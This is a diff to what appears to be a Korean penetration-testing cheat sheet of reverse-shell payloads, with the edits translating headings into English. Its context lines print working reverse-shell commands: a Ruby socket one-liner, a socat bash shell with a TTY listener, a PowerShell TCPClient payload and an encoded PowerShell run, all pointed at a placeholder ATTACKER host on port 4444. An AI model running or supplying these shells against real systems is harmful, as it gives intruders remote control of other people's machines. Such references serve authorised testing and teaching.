@@ -4,7 +4,7 @@ target 에서 공격자 listener 로 커넥션을 물어오게 만드는 payload
 
 ---
 
-## 리스너
+## listener
 
 ```bash
 # Netcat
@@ -81,7 +81,7 @@ ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i
 # target
 socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 
-# 리스너 (TTY 쉘)
+# listener (TTY shell)
 socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
 ```
 
@@ -96,7 +96,7 @@ $client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $cl
 ```
 
 ```powershell
-# Base64 인코딩 실행
+# Base64 encoding 실행
 powershell -e BASE64_PAYLOAD
 
 # Powercat
